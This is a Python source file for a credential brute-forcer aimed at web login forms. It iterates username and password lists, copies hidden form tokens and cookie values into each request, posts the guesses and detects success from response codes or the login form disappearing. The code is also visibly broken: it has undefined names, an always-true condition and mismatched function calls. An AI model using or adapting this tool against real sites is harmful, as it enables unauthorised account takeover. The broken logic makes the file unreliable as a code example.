import logging
import sys
import webParser
import requests
from bs4 import BeautifulSoup
import ssl
from html_similarity import style_similarity, structural_similarity, similarity
from lxml import html

def brute(parameters):
    """
    sends all combinations for usernames and passwords to the attack function on the login page
    """
    parameters['statusCode'] = 'wrong'
    parameters['statusCode'] = get_status_code(parameters)
    
    if 'javascipt':
        hosam = headless()
    else:
        hosam = requests()
        
    for username in parameters["Usernames"]:
        parameters["username"] = username.strip()
        for password in parameters["Passwords"]:
            parameters["password"] = password.strip()
            hosam.attack(web_parser, params)
            
            if check_login(hosam):
                pass


def attack(content):
    """
    create a packet containing fake headers and the payload(username,password) and submit it to the server
    """

    if content["type"] == "javascript":
       pass
    else:
        res = requests.get(content["url"])
        body = res.text

    soup = BeautifulSoup(body, "html.parser")

    payload = content["req_body"]
    cookies = res.cookies
    payload[content["user_param"]] = content["username"]
    payload[content["password_param"]] = content["password"]

    for token in payload:
        if token != content["user_param"] and token != content["password_param"]:
            inputs = soup.find("input", {"name": token})
            if inputs:
                payload[token] = inputs["value"]
                logging.debug(str(payload[token]) + ' value has changed to ' + str(inputs["value"]))

    payload, cookies = change_cookiesToken(cookies, payload)

    logging.info("[+ payload]: " + str(payload))
    
    resp = post(content, payload, cookies)

    if check_login(resp, content, payload):
        logging.info(
            "login successfull\n\nusername: "
            + content["username"]
            + "\npassword: "
            + content["password"]
        )

        sys.exit(1)
    return resp.status_code

def post(content, payload, cookies):
    header = content['headers']
    if content["req_body_type"] == "XML":
            pass

    elif content["req_body_type"] == "JSON":
        resp = requests.post(content["url"], json=payload, cookies=cookies, headers=header)

    elif content["req_body_type"] == "multipart":
        for param in payload:
            payload[param] = (None, payload[param])
        resp = requests.post(content["url"], files=payload, cookies=cookies, headers=header)

    else:
        resp = requests.post(content["url"], data=payload, cookies=cookies, headers=header)
        
    return resp

def check_login(response, args, payload):
    """
    checks if login was successful by checking if status code changed and checks if form is still in the page
    """
    if args['statusCode'] == 'wrong':
        return False
    
    if response.status_code >= 400:
        return False

    elif response.status_code != args['statusCode']:
        return True
    
    else:
        if args['type'] != 'javascript':
            doc = html.document_fromstring(response.text)
            form = webParser.pickForm(doc.xpath('//form'), payload)
            if form == None:
                return True
    return False


########################################################################################


def change_cookiesToken(cookies_jar, req_body):
    cookies = {}
    for cookie in cookies_jar:
        cookies[cookie.name] = cookie.value

    for item in cookies.keys():
        if item[1:] in req_body:
            req_body[item[1:]] = cookies[item]
        if item in req_body:
            req_body[item] = cookies[item]
    if len(cookies) == 0:
        cookies = None

    return req_body, cookies

def  get_status_code(parameters):
    parameters["username"] = 'hosam' # change to random!
    parameters["password"] = 'password'
    statusCode = attack(parameters)
    return statusCode